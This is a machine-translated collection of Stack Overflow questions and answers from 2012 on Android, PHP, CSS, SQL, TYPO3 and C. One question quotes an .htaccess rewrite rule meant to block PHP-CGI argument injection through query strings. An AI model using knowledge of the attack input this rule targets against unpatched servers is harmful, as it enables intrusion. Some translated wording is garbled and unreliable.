这是 jquery 的 cookie 插件[https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-04T14:27:09.760

如果您正在开发一个针对 W3C 兼容浏览器（或 HTML5 兼容，准确地说）的 Web 应用程序，那么随时欢迎您使用**WebStorage**。它的界面非常简单，在您的情况下使用它是 cookie 的一个很好的替代品。

您可以在`localStorage`（永久）和`sessionStorage`（临时）之间进行选择。它们都是`Window`对象的属性。

例子：

```
localStorage.setItem('clicked', 'elementID'); // stores some data
localStorage.getItem('clicked'); // returns corresponding data 
```

基本上，您以键值方式将一个字符串映射到另一个字符串。例如，值可能被格式化为 JSON 字符串，表示点击元素的 ID 数组。

为确保您的用户数据存储功能“无处不在”，请查看[Modernizr 库](http://modernizr.com/)。它为缺少的属性实现了存根：在`localStorage`（或`sessionStorage`）的情况下，它回退到使用 cookie。

# java - Android - Eclipse：“令牌“（”的语法错误，此令牌后预期的表达式”

> ID：10446385
> 
> 赞同：1
> 
> 时间：2012-05-04T09:40:10.407
> 
> 标签：java, android, arrays, button, download

如何设置数组以更改多个按钮的异步下载任务的 URL？这不起作用，我不知道如何解决它。

```
final String[] dlUrl = new String[]{"www.google.com/document.pdf", "www.google.com/document2.pdf", "www.google.com/document3.pdf"};{ 
for(int k = 0; i < dlUrl.length; i++) { 
    final String dlUrl = downloadFile.execute([k]); 

} 
```

我试图让它更改以下代码部分：

```
private void startDownload() {
    DownloadFile downloadFile = new DownloadFile();
    downloadFile.execute("http://www.google.com/doc.pdf");

} 
```

以及异步任务本身：

```
class DownloadFile extends AsyncTask<String, Integer, String> {

URL url = new URL(aurl[0]);
URLConnection connection = url.openConnection(); 
```

我有一个类似的数组可以拾取按钮按下，我想尝试将它添加到它......有什么想法吗？

```
final OnClickListener listener = new OnClickListener() { 
     public void onClick(View v){ 
         switch(v.getId()){  
         case R.id.sec1:  
            break; 
         case R.id.sec2: 
            break; 
         case R.id.sec3: 
            break; 
         } 
     } 
};
final int[] btnIds = new int[]{R.id.sec1, R.id.sec2, R.id.sec3};{ 
for(int i = 0; i < btnIds.length; i++) { 
    final Button btn = (Button) findViewById (btnIds[i]); 
    btn.setOnClickListener(listener); 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:43:21.637

```
final String[] dlUrl = new String[]{"www.google.com/document.pdf",
                                    "www.google.com/document2.pdf",
                                    "www.google.com/document3.pdf"};{ 

for(int k = 0; i < dlUrl.length; i++) { 
    final String dlUrl = downloadFile.execute([k]); 

} 
```

可能应该更像

```
final String[] dlUrl = new String[]{"www.google.com/document.pdf",
                                    "www.google.com/document2.pdf",
                                    "www.google.com/document3.pdf"}; // { removed

for(int k = 0; k < dlUrl.length; k++) { 
               ^

    final String currentUrl = dlUrl[k];
                              ^^^^^^^^

    downloadFile.execute(currentUrl); 
} 
```

* * *

关于你自己的评论：

> *通过反复试验学习 Java 和 android 是困难的*

...我必须补充一个非常糟糕的主意。

# android - JSONObject中的JSONArray，如何检索？

> ID：10446387
> 
> 赞同：0
> 
> 时间：2012-05-04T09:40:30.170
> 
> 标签：android, json, arrays

我有一个带有 2 个带有 JSONObjects 的 JSONArrays 的 JSONObject。我想知道如何访问位于 JSONObject 中的 JSONArray 中的 JSONObjects？（JSON inception！）。

澄清（即使我对写这个感到困惑）

我首先得到一个 JSONObject 这个对象包含 2 个 JSONArrays 这 2 个数组有 X 和 Y 数量的 JSONObjects。

我如何达到“最深”的 JSONObjects？如何“展开”第一个 JSONObject 以获得前 2 个 JSONArray？

有什么提示或技巧可以分享吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:53:02.117

尤可以用这样的东西`new JSONObject(json).getJSONArray(arrayname1).getJSONObject(positionx)`。
这`json`是 JSON 响应字符串。`arrayname1`是您的第一个数组的名称。并且`poitionx`是来自X JSONObjects 的任何位置。
同样，您可以将`new JSONObject(json).getJSONArray(arrayname2).getJSONObject(positiony)`其用于另一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:49:20.967

> 有什么提示或技巧可以分享吗？

是的，使用像Google 的[GSON](http://code.google.com/p/google-gson/)这样的 JSON 库。

这是使用它的参考。[http://java.sg/parsing-a-json-string-into-an-object-with-gson-easily/](http://java.sg/parsing-a-json-string-into-an-object-with-gson-easily/)

祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-19T13:41:06.810

这是示例。假设我们有一个 JSONObject“Space”，它有两个数组：一个和两个。

```
 HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("url");
                 HttpResponse  response = httpclient.execute(httppost);
                 HttpEntity entity = response.getEntity();
                 InputStream instream = entity.getContent();
                 String result= convertStreamToString(instream);
                 JSONObject json=new JSONObject(result);
                 JSONObject resp= (JSONObject) json.get("response");                                  
                 JSONObject Space=resp.getJSONObject("Space");
                 JSONArray One=Space.getJSONArray("one");
                 int Length=One.length();
                 for(int i=0;i<length;i++)
                 {
                  JSONObject item = (JSONObject) items.get(j);
                   String x=item.getString("x);
                   String y=item.getString("y");
                   System.out.println("x = "+x+" , y = "+y);
                 } 
```

以同样的方式，您可以使用第二个数组。

# php - php：检查文件是否打开

> ID：10446395
> 
> 赞同：1
> 
> 时间：2012-05-04T09:41:29.847
> 
> 标签：php, file

我正在编写一个文档管理系统。已请求的功能之一是用户能够使系统将某些文件复制到用户和 php 都可以访问的位置。从这里用户将能够直接编辑文件。需要发生的是，编辑后的文件必须作为新版本自动保存到文档管理系统中。我的问题是关于最后一点。

我有一个页面，允许用户查看特定文件的所有版本。我在想，当任何人访问此页面时，php会检查是否存在已编辑且现在已关闭的关联文件，然后将其移动到正确的位置并为其提供版本信息，这将是一件很酷的事情. 这可能吗？例如，如果用户正在使用 MS Word 编辑文件，php 是否能够知道该文件是否正在使用？如果是，如何？

另一种选择是只抓取所有定期编辑的文件（例如在巫师时间），并且还有一个方便的“同步”按钮，用户可以单击该按钮以表示他们已经完成。

这是我尝试过的一些东西：flock：我认为它对于正在使用的文件返回 false。错误的 fstat：据我所知没有返回任何有用的东西 unlink：我想我可能会复制文件然后尝试取消链接原始文件（用户编辑的）。事实证明 unlink 适用于打开的东西

有任何想法吗？

另外，它需要在windows和linux上工作......

以下是他们需要的一些说明：如果安德鲁要单击与 word 文件相对应的“编辑”按钮，则 word 文件将被复制到某个位置。然后，Andrew 将使用 MS Word 对其进行编辑，保存他的更改（可能不止一次）并关闭它。这就是我希望安德鲁做的一切。我希望我的代码看到文件已关闭，然后对其进行处理

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:03:21.397

您可以为每个打开的文件创建一个文件“filename.lock”（或“filename.lck”）。并且在解锁时删除文件“filename.lock”（或“filename.lck”）。

当文件“filename.lock”（或“filename.lck”）存在时，您可以检查文件是否被锁定。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:56:55.823

如果你在 unix 操作系统下运行，你可以实现这样的策略：

1.  像这样写一个bash脚本`lsof | grep /absolute/path/to/file.txt`

    你也可以参数化

2.  从 php 中调用该脚本

`<?php $result=shell_exec("myScriptPath"); echo($result); ?>`

请记住，如果没有人打开文件，bash 脚本将返回状态 0，否则返回 256 (1)

# memory - C 程序的空间确定

> ID：10446401
> 
> 赞同：0
> 
> 时间：2012-05-04T09:41:45.753
> 
> 标签：memory, gcc, cygwin, gcc3

我可以确定 C 程序占用的空间吗？目前我在 Windows XP 上使用 GCC 编译器。实际上我想检查 C 程序消耗了多少空间。

如果某个函数告诉我 C 中其他函数消耗的大小，那就太好了。

```
ex- fun() consume 1028 bytes to run. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T11:04:16.290

在磁盘上：当然：编译它，制作`ls`或`dir`.

在内存中：不。想象一下一个程序，它把互联网上的东西加载到内存中。由于内存是动态分配的，并且您事先不知道数据有多大，因此无法判断内存使用情况（理论上这只是停机问题的结果）。

# php - php安全漏洞，这个修复会影响我的错字3

> ID：10446403
> 
> 赞同：2
> 
> 时间：2012-05-04T09:41:50.810
> 
> 标签：php, .htaccess, typo3

[h-在线](http://www.h-online.com/security/news/item/Critical-open-hole-in-PHP-creates-risks-Update-2-1567532.html)

```
RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]  
RewriteRule ^(.*) $1? [L] 
```

此修复会影响我的typo3 (4.5) 安装吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:53:05.933

简短的回答是否定的。长答案我仅在使用 lighttpd + FastCGI 和 Typo3 4.5.5 的安装中对其进行了测试。index.php 没有作为文本文件加载到我的浏览器窗口中。

# ipad - 想准备 iPad App 类似的 iPad Mail app

> ID：10446405
> 
> 赞同：1
> 
> 时间：2012-05-04T09:42:07.800
> 
> 标签：ipad

我想创建一个与 Apple 的 Mail 应用程序具有相似用户界面的 iPad 应用程序，即：

*   拆分视图左侧的 RootView 控制器（表视图），用于使用多视图层次结构进行导航。选择桌单元时，将新的表视图推在左侧
*   然后左侧的新视图可以更新详细视图。（这里出现问题，因为左侧的新视图与详细视图失去了联系）

为了应用这些功能，我们使用 UISplitViewController。

# html - 可自动调节的侧 DIV

> ID：10446406
> 
> 赞同：0
> 
> 时间：2012-05-04T09:42:09.013
> 
> 标签：html, css, autoresize

我很难找到并排创建 3 个 DIV 的方法，其中中间的 DIV 具有静态大小（比如说 900 像素），而左侧和右侧的 DIV 具有自动调节的宽度。

我需要这样做才能将背景放在侧面 DIV 上，因为中间 div 已经具有透明背景，因此我无法为中间的 DIV 创建一个包装器 DIV，而中间的 DIV 则包含另一个背景。正如您可能想象的那样，您将能够看穿中间 DIV 的背景。

有任何想法吗？:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:21:07.877

这是你想要的吗？

HTML：

```
<div class="wrapper">

    <div class="side" style="float:right;width:50px;">side</div>
    <div class="side" style="float:left;width:50px;">side</div>
    <div class="middle" style="margin:0 50px;">content middle</div>

    <div style="clear:both; height: 40px;"></div>

    <div id="container">

        <div class="left">side</div>
        <div class="center">center</div>
        <div class="right">side</div>

    </div>

</div> 
```

CSS：

```
.wrapper {
    max-width: 1000px;
}

.side, .middle {
    text-align: center;
}
.side {
    background: red;
}
.middle {
    background: blue;
    color: white;
}

#container {
    display: table;
    width: 100%;
}

.left, .center, .right {
    display: table-cell;
    text-align: center;
    background: red;
}

.center {
    width: 500px;
    background: blue;
    color: white;
} 
```

[jsfiddle](http://jsfiddle.net/Autodealers/266PG/)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-04T10:09:33.080

我猜你需要一个有 3 列的网站，左边是菜单，中间是内容，右边是广告或附加信息的空间。

我会选择类似的东西：

```
<div class="side" style="width:10%; float:left;">content</div>

<div class="middle" style="width:900px; float:left;">content middle</div> 

<div class="side" style="width:10%; float:left; clear:both; ">content</div> 
```

根据大小和位置，将侧边类用于侧边栏，将中间类用于主要内容。

# wordpress - xml 解析错误 xml 或文本声明不在 wordpress 提要中实体的开头

> ID：10446408
> 
> 赞同：5
> 
> 时间：2012-05-04T09:42:14.477
> 
> 标签：wordpress, rss

我的 wordpress 网站出现以下错误，

```
XML Parsing Error: XML or text declaration not at start of entity
Location: http://www.domain.com/news/feed/rss/
Line Number 3, Column 3:        <?xml version="1.0" encoding="UTF-8"?><rss version="0.92">
----------------^ 
```

我已经尝试了几乎所有通过谷歌找到的解决方案，也在stackoverflow中尝试了相同问题的答案，但我仍然收到这个错误。

有没有人知道如何摆脱它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-13T12:21:29.110

尝试安装[fix-rss-feed](http://wordpress.org/extend/plugins/fix-rss-feed/)插件。

另外我认为你之前有一个空间`<?xml version="1.0" encoding="UTF-8"?>`。摆脱它应该可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-19T13:25:51.770

fix-rss-feed 插件已过时。我对 RSS 提要有同样的问题，尝试这里提供的解决方案[http://wejn.org/stuff/wejnswpwhitespacefix.php.html](http://wejn.org/stuff/wejnswpwhitespacefix.php.html)它就像魅力一样！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-05T04:17:31.117

在我看来，与其使用插件，更好的解决方案是删除主题目录中所有 PHP 文件中的所有尾随空格。在终端窗口中运行：

```
cd yoursite/wp-content/themes/yourtheme 
```

然后运行

```
find ./ -name "*.php" -exec sed -i -e '/^\n*$/d' {} \; 
```

运行后，尝试导航到`yoursite.com/feed`

# google-refine - 有没有办法对已经“刻面”的表进行子刻面？

> ID：10446411
> 
> 赞同：2
> 
> 时间：2012-05-04T09:42:26.430
> 
> 标签：google-refine

我有一张表，我在其上应用自定义方面以查找重复项（在一列上）。现在我想在带有刻面的表格上应用一个新的刻面（在另一列上）。

那可能吗？似乎每次只能使用一个方面，而不能将它们组合在一起。

干杯，

酶联免疫吸附试验

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T17:54:02.363

Facets can be combined on the same column or on multiple one to narrow down your data. When you facet on two different column in the same time, result are a combination of: facet 1 AND facet 2\. So in you case it will be within your duplicate records, records that match the criteria of your second facet.

You can also combine facet within the same column to create. You can read more about faceting here: [http://googlerefine.blogspot.ca/2011/09/use-google-refine-to-navigate-data.html](http://googlerefine.blogspot.ca/2011/09/use-google-refine-to-navigate-data.html)

# c# - 在 BackgroundWorker DoWork 事件中读取 ComboBox 值时出错

> ID：10446417
> 
> 赞同：1
> 
> 时间：2012-05-04T09:42:51.050
> 
> 标签：c#, winforms

`BackgroundWorker` `DoWork`当我在事件中 访问表单控件时，它会从**DatePicker**读取值，但不会从**TextBox**或**ComboBox读取值**

**错误：**

```
Cross-thread operation not valid: Control 'cmbProgram' accessed from a thread other than the thread it was created on. 
```

![在此处输入图像描述](../Images/4eeae20ee04ca6a48a4faf3d7167f22b.png)

**代码 ：**

```
private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
        string strDate = dtpDate.Value.ToString();

        string strProgram = cmbProgram.Text;

    } 
```

它如何从 DataPicker 读取值（在不同的线程中）？

是否有任何解决方法可以从`BackgroundWorker` `DoWork`事件访问表单控件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:49:22.303

您不能从不同的线程访问控件。解决该问题的常用方法是从 UI 线程读取当前值，然后将该值传递给第二个线程（或 BackgroundWorker）。

您可以通过将控件类上的 CheckForIllegalCrossThreadCalls 设置为 false 来禁用检查，但建议您不要这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:53:15.133

采用：

```
Dispatcher.Invoke(new Action(() =>
           {
                string strDate = dtpDate.Value.ToString();
                string strProgram = cmbProgram.Text;

           })); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:53:38.747

您可以将其作为参数传递。例如：

```
backgroundworker1.RunWorkerAsync(comboBox1.SelectedItem.ToString()); 
```

并抓取`doWork`with中的内容

```
string Item = e.Argument.ToString(); 
```

# android - 是否可以在应用程序菜单中而不是在 android 的主屏幕上显示 appwidget？

> ID：10446419
> 
> 赞同：0
> 
> 时间：2012-05-04T09:43:06.013
> 
> 标签：android, android-widget

是否可以在应用程序菜单中显示 appwidget 而不是在 android 的主屏幕上显示？

在我的应用程序中，我必须用数值​​通知启动器图标，我创建了一个工作正常的小部件，并且可以在主屏幕上看到，但我想要它在应用程序菜单中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T09:51:08.267

不可以。应用程序菜单（至少是默认 Home 应用程序中的默认应用程序菜单）没有实现 Widget Host 接口，所以没有办法做到这一点。

您可能会发现一个提供小部件托管服务的自定义 Home 应用程序，但还没有真正看到有人这样做。

# c - 看到值存储在内存中以检查字节顺序？

> ID：10446423
> 
> 赞同：0
> 
> 时间：2012-05-04T09:43:25.060
> 
> 标签：c

如果我调试这个 C 代码：

```
unsigned int i = 0xFF; 
```

如果是小端系统，调试器是否会在内存中显示 0x00FF，如果是大端系统，是否会在内存中显示 0xFF00？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:52:47.167

如果：

*   您的系统有 8 位`char`s。
*   `unsigned int`您的系统使用 16 位
*   您的调试器将内存显示为简单的十六进制字节

`&i`如果它是 little-endian ，你会看到这个：

```
ff 00 ?? ?? ?? ?? ?? ?? 
```

如果它是大端的：

```
00 ff ?? ?? ?? ?? ?? ?? 
```

问号仅代表`i`内存中的字节。

注意：

*   little-endian 机器会将具有最低值的字节存储在最低地址。
*   大端机器将在最低地址存储具有最大值的字节。
*   C 没有指定`unsigned int`. 这取决于实施。
*   您可以使用`CHAR_BIT * sizeof (unsigned int)`.

如果您的机器使用 32-bit `unsigned char`，您会看到：

```
ff 00 00 00 ?? ?? ?? ?? 
```

在小端的情况下，在大端的机器上你会看到：

```
00 00 00 ff ?? ?? ?? ?? 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:50:14.510

如果您查看地址周围的原始内存内容，`&i`那么是的，您将能够分辨出差异。但这将`00 00 00 ff`适用于大端和`ff 00 00 00`小端，假设`sizeof(unsigned int)`是 4 并且`CHAR_BIT`（每字节的位数）是 8——在问题中你已经交换了它们。

您还可以通过以下几种技巧之一以编程方式检测字节顺序（即您可以制作一个打印出其运行架构的字节顺序的程序）；例如，请参阅[在 C++ 程序中以编程方式检测字节顺序](https://stackoverflow.com/questions/1001307/detecting-endianness-programmatically-in-a-c-program)（解决方案也适用于 C）。

# sql - 在一列上获取子记录

> ID：10446424
> 
> 赞同：3
> 
> 时间：2012-05-04T09:43:35.630
> 
> 标签：sql, sql-server, sql-server-2005

我有一个像这样的表父和表子：

```
Parent
ID   Name
1    Parent1
2    Parent2

Son
ID   ParentID
10      1
20      1
30      1
15      2
25      2 
```

在选择父母时，最简单的方法是在单个列上获取所有儿子的 ID？像这样：

```
Result:
ID   Name      AllMySons
1    Parent1   10,20,30
2    Parent2   15, 25 
```

我想构建一个函数来与儿子一起生成字符串，但有人有更好的主意吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T09:52:07.687

```
select P.ID,
       P.Name,
       stuff((select ','+cast(S.ID as varchar(10))
              from Son S
              where S.ParentID = P.ID
              for xml path('')), 1, 1, '') AllMySons
from Parent P 
```

[SE-数据](https://data.stackexchange.com/stackoverflow/query/68979)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:56:35.177

这个怎么样。

```
SELECT p1.id,
       p1.name,
       AllMySons = Replace ((SELECT s.id AS 'data()'
                             FROM   son s
                             WHERE  p1.id = s.parentid
                             FOR xml path('')), ' ', ', ')
FROM   parent p1
GROUP  BY p1.id,
          p1.name; 
```

# javascript - 我应该包含哪些更少的文件才能使用 twitter 引导选项卡？

> ID：10446425
> 
> 赞同：4
> 
> 时间：2012-05-04T09:43:37.797
> 
> 标签：javascript, css, twitter-bootstrap

我正在使用 twitter 引导选项卡，我只想加载它们所需的 CSS，我应该加载什么？现在我正在使用

```
 @import "reset.less";

  // Core variables and mixins
  @import "variables.less"; // Modify this for custom colors, font-sizes, etc

  @import "mixins.less";

  // Grid system and page structure
  //@import "scaffolding.less";
  //@import "grid.less";
  //@import "layouts.less";

  // Base CSS
  @import "type.less";
  //@import "code.less";
  //@import "forms.less";
  //@import "tables.less";

  // Components: common
  //@import "sprites.less";
  //@import "dropdowns.less";
  @import "wells.less";
  //@import "component-animations.less";
  //@import "close.less";

  // Components: Buttons & Alerts
  @import "buttons.less";
  //@import "button-groups.less";
  //@import "alerts.less"; // Note: alerts share common CSS with buttons and thus have styles in buttons.less

  // Components: Nav
  @import "navs.less";
  @import "navbar.less";
  //@import "breadcrumbs.less";
  //@import "pagination.less";
  //@import "pager.less";

  // Components: Popovers
  //@import "modals.less";
  //@import "tooltip.less";
  //@import "popovers.less";

  // Components: Misc
  //@import "thumbnails.less";
  //@import "labels.less";
  //@import "badges.less";
  //@import "progress-bars.less";
  //@import "accordion.less";
  //@import "carousel.less";
  @import "hero-unit.less";

  // Utility classes
  @import "utilities.less"; // Has to be last to override when necessary 
```

我需要更多吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:48:55.333

我认为这就足够了，将这些较少的文件用于所有类型的导航和选项卡

```
navs.less, mixin.less, 
```

但这也取决于标签的样式，如果可能的话，请告诉我样式

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-03T12:25:42.080

即使这是旧的并且已经回答，如果有人偶然发现了一些你真正需要的 google-fu，如果你无论如何都要自己设计它们，那么下面是。

```
.tab-content {
    > .tab-pane {
        display: none;
        visibility: hidden;
    }
    > .active {
        display: block;
        visibility: visible;
    }
} 
```

# css - CSS 多重选择器

> ID：10446430
> 
> 赞同：0
> 
> 时间：2012-05-04T09:44:16.933
> 
> 标签：css

我想为两个具有不同 ID 的链接设置一个属性。链接包含在 ID 为 UserDiv 的 div 中。像这样的东西：

```
div#UserDiv (a#login_link, a#register_link){
    float:right;
} 
```

但这显然行不通。甚至可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T09:45:17.010

该语法不合法，但您可以这样做。通常，您需要重复该`div#UserDiv`部分：

```
div#UserDiv a#login_link, div#UserDiv a#register_link
{
    float:right;
} 
```

在这种特定情况下，您可能可以完全删除 div 选择器，因为锚点的 id 足以唯一标识它们。当然，这取决于您在不同情况下不在 DOM 的不同部分使用这些相同的 id，恕我直言，这是一个好主意。

# sql-server-2008 - 向 SELECT 查询的结果添加计数器

> ID：10446431
> 
> 赞同：3
> 
> 时间：2012-05-04T09:44:19.783
> 
> 标签：sql-server-2008, ssms

我正在尝试将计数器添加到 Select 结果列表中。保持简单，我的查询是这样的：

```
Select distinct '"'+cast((product_sku) as varchar(30))+'"' as product_sku,preco,'"tamanhoecor::' + Left(Main.preco,Len(Main.preco)-1) + '"' As "custom_price"
From(
Select distinct ST2.product_sku,

        (Select cordesc + ' - ' + tamanho +':' + cast(price_dif as varchar) + ';'
        From [mg_produtos_preco] ST1
        Where ST1.product_sku = ST2.product_sku 
        ORDER BY ST1.product_sku
        For XML PATH ('')) [Preco],
        product_price, cordesc,tamanho
        From [mg_produtos_preco] ST2) [Main] 
```

这让我明白了：

```
product_sku     preco                                                custom_price
"340803 010"    Preto - S:0;Preto - M:0;Preto - L:0;Preto - XL:0;    "tamanhoecor::Preto - S:0;Preto - M:0;Preto - L:0;Preto - XL:0"
"340803 100"    Branco - S:0;Branco - M:0;Branco - L:0;              "tamanhoecor::Branco - S:0;Branco - M:0;Branco - L:0" 
```

但是，我需要这个：

```
product_sku     preco                                                      custom_price
"340803 010"    Preto - S:0:0;Preto - M:0:1;Preto - L:0:2;Preto - XL:0:3;  "tamanhoecor::Preto - S:0:0;Preto - M:0:1;Preto - L:0:2;Preto - XL:0:3"
"340803 100"    Branco - S:0:0;Branco - M:0:1;Branco - L:0:2;              "tamanhoecor::Branco - S:0:0;Branco - M:0:1;Branco - L:0:2" 
```

我尝试使用在这里找到的内容：http: [//msdn.microsoft.com/en-us/library/ms187330%28v=sql.105%29.aspx](http://msdn.microsoft.com/en-us/library/ms187330%28v=sql.105%29.aspx)

我试过 DECLARE @pos nvarchar(30) Select .... (@pos + = 1) .... from .... (SELECT @pos=0) ....

但我收到“'DECLARE' 附近的语法不正确。期待 '('、SELECT 或 WITH。”，加上“= 附近的语法不正确

我尝试了这段代码，它有效：

```
GO
DECLARE @var1 nvarchar(30)
SELECT @var1 = 'Generic Name'
SELECT @var1 = (
SELECT AppUserName
FROM [AppUsers]
WHERE AppUserID = 1000)
SELECT @var1 AS 'Company Name' ; 
```

我将不胜感激任何帮助。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:49:01.183

你说的计数器是什么意思？你想每行增加一个数字吗？如果是，试试这个：

```
select row_number() over (order by your_column), * 
from your_table 
```

# typo3 - TYPO3 Fluid Template 获取语言代码

> ID：10446432
> 
> 赞同：12
> 
> 时间：2012-05-04T09:44:30.297
> 
> 标签：typo3, fluid

是否可以在 TYPO3 Fluid 模板中获取当前语言键（或代码）？

同时，我使用[此处](http://www.auxnet.de/blog/blog-post/2012/02/28/typo3-sprachen-viewhelper-fuer-fluid.html)找到的视图助手找到了另一个解决方案：

```
<?php
class Tx_AboUnitReservation_ViewHelpers_LanguageViewHelper extends Tx_Fluid_Core_ViewHelper_AbstractViewHelper {

    /**
     * Get the current language
     */
    protected function getLanguage() {
        if (TYPO3_MODE === 'FE') {
            if (isset($GLOBALS['TSFE']->config['config']['language'])) {
                return $GLOBALS['TSFE']->config['config']['language'];
            }
        } elseif (strlen($GLOBALS['BE_USER']->uc['lang']) > 0) {
            return $GLOBALS['BE_USER']->uc['lang'];
        }
        return 'en'; //default
    }

    /**
     * Return current language
     * @return  string
     */
    public function render() {
        return $this->getLanguage();
    }

}

?> 
```

我在流体模板中使用如下。

```
<f:alias map="{isGerman: 'de'}">
    <f:if condition="{aboUnitReservation:language()} == {isGerman}">
        <script type="text/javascript" src="{f:uri.resource(path:'js/jquery.ui.datepicker-de-CH.js')}"></script>
    </f:if>
</f:alias> 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2016-01-12T13:44:32.930

在 Fluid 模板中使用 TypoScript 对象的另一种解决方案：

```
# German language
temp.language = TEXT
temp.language.value = at

# English language
[globalVar = GP:L = 1]
  temp.language.value = en
[global]

lib.language < temp.language 
```

和流体代码：

```
<f:if condition="{f:cObject(typoscriptObjectPath: 'lib.language')} == 'at'">
    <f:then>
        ...
    </f:then>
    <f:else>
        ...
    </f:else>
</f:if> 
```

当然，对象`temp.language`可以包含任何值。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-04T10:34:23.207

您可以在您的操作中分配变量：

```
$this->view->assign("sysLanguageUid", $GLOBALS['TSFE']->sys_language_uid); 
```

然后在您的视图中阅读它：

```
<f:if condition="{sysLanguageUid} == 0">
    You're reading English version of page
</f:if> 
```

**另一方面**，在控制器中分配 redy-to-use 变量会更容易和更舒适，因为`<f:if ...>`块非常简单，有时只是不舒服：

```
switch ($GLOBALS['TSFE']->sys_language_uid) {
    case 1:
        $msg = "Bienvenidos";
        break;
    case 2:
        $msg = "Willkommen";
        break;
    default:
        $msg = "Welcome";
        break;
}

$this->view->assign("myMessage", $msg); 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-03-27T11:35:06.713

为了获取当前语言，您可以使用 VHS 扩展中包含的 Page/LanguageViewHelper。

```
{v:page.language(languages: 'en,fr', pageUid: '0', normalWhenNoLanguage: 'en')} 
```

看看这里： http: [//fluidtypo3.org/viewhelpers/vhs/1.8.3/Page/LanguageViewHelper.html](http://fluidtypo3.org/viewhelpers/vhs/1.8.3/Page/LanguageViewHelper.html)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-07-24T14:13:17.800

我的解决方案是这样的：

**数据 = TSFE:sys_language_uid**

（输出是语言 UID）

```
page = PAGE
page {

    ## Fluid-Template ##
    10 = FLUIDTEMPLATE
    10 {
        ## Variablen ##
        variables {
            pageTitle = TEXT
            pageTitle.data = page:title
            siteTitle = TEXT
            siteTitle.data = TSFE:tmpl|setup|sitetitle
            rootPage = TEXT
            rootPage.data = leveluid:0
            baseurl = TEXT
            baseurl.value = {$config.domain}
            pageLanguage = TEXT
            pageLanguage.data = TSFE:sys_language_uid
        }

        ## Settings ##
        settings {

        }
    }
} 
```

现在您可以在 FLUID 中使用新的“变量”：

```
<f:if condition="{pageLanguage}==0">
    <f:then><a href="http://domain.cc/" title="">DE</a></f:then>
    <f:else><a href="http://domain.cc/en/" title="">EN</a></f:else>
</f:if> 
```

或者您将其用于更多语言代码：

```
<f:if condition="{pageLanguage}==0">
    <f:then>Do this</f:then>
    <f:else if="{pageLanguage}==1">
        Do this instead if variable two evals true
    </f:else>
    <f:else if="{pageLanguage}==2">
        Or do this if variable three evals true
    </f:else>
    <f:else>
        Or do this if nothing above is true
    </f:else>
</f:if> 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2021-08-05T11:44:26.850

# 通过 TYPO3 语言方面的另一种方法

## Extbase 扩展中的示例（例如`showAction`）

```
# instantiate TYPO3 Context and get language aspect
$languageAspect = GeneralUtility::makeInstance(Context::class)->getAspect('language');

# now assign any property of the actual language to the view. In this example: the language uid.
$this->view->assign('actualLanguageId', $languageAspect->getId()); 
```

*在 TYPO3 10.4 LTS 中测试的示例*

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-11-13T01:10:56.947

另一种选择是使用`v:page.languageMenu`VHS 扩展中的 ViewHelper。它将允许您与其他 ViewHelper 组合并在 Fluid 模板中使用类似以下内容：

```
{namespace v=Tx_Vhs_ViewHelpers}
<v:page.languageMenu as="languages">

    <!-- gets the current language key -->
    {languages -> v:iterator.filter(propertyName: 'current', filter: 1)}

    <!-- iterates over flag names of all languages which apply to the current page -->
    <f:for each="{languages -> v:iterator.extract(key: 'flag')}" as="languageFlagName">

        <!-- example suggestion: image -->
        <f:image src="{f:uri.resources(path: 'Images/Flags/{languageFlagName}.png')}" />

        <!-- example suggestion: label read from LLL:EXT:myext/Resources/Private/Language/locallang.xml:languages.$languageFlagName -->
        <f:translate key="languages.{languageFlagName}" default="{languageFlagName} />

    </f:for>

</v:page.languageMenu> 
```

您可以使用从每个 ViewHelpers 返回的值做*更多*事情 - 例如，您可以使用`v:var.set`在模板中定义包含提取的标志名称的新变量：

```
<!-- Using {languages} inside <v:page.languageMenu> like above -->
{languages -> v:iterator.filter(propertyName: 'current', filter: 1) -> v:var.set(name: 'currentLanguage')}
<!-- variable {currentLanguage} now contains an array of values describing the current language --> 
```

# sql - 插入员工的过程：PL/SQL 语句被忽略

